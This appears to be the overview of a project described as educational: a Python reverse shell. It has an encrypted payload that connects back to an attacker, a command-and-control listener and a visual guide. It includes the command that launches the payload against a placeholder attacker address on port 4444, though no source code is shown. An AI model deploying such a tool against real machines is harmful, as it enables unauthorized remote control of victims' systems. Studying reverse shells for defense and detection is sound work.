✅ PROJECT OVERVIEW
═══════════════════════════════════════════════════════════════════════════════

This is a COMPLETE EDUCATIONAL PROJECT for understanding reverse shells:

What is a Reverse Shell?
  A remote command execution tool where the VICTIM connects BACK to the 
  ATTACKER (instead of the attacker connecting to the victim).

What You'll Learn:
  ✓ Network programming (TCP sockets)
  ✓ Cryptography (AES-256-CBC encryption)
  ✓ System commands and shell execution
  ✓ Post-exploitation techniques
  ✓ Security concepts and detection methods

EXECUTABLES (The Code):
──────────────────────────────────────────────────────────────────────────────

1. client.py (205 lines)
   • THE PAYLOAD - Run this on the victim's machine
   • Connects back to the attacker every 5 seconds
   • Executes commands and sends output back
   • All traffic encrypted with AES-256
   • Auto-reconnects on connection loss
   
   Run: python client.py --ip <attacker_ip> --port 4444

2. listener.py (223 lines)
   • THE COMMAND & CONTROL SERVER - Run this on your machine
   • Listens for incoming reverse connections
   • Provides interactive shell prompt
   • Decrypts and displays command output
   • Color-coded output for easy reading
   
   Run: python listener.py --port 4444

3. gui_visualizer.py (350 lines) ✨ NEW!
   • INTERACTIVE VISUAL GUIDE
   • Shows architecture diagrams
   • Demonstrates the 10-step workflow
   • Explains AES-256 encryption
   • Includes animated communication demo
   • Feature overview and usage guide
   
   Run: python gui_visualizer.py
   This is THE BEST way to understand the project!
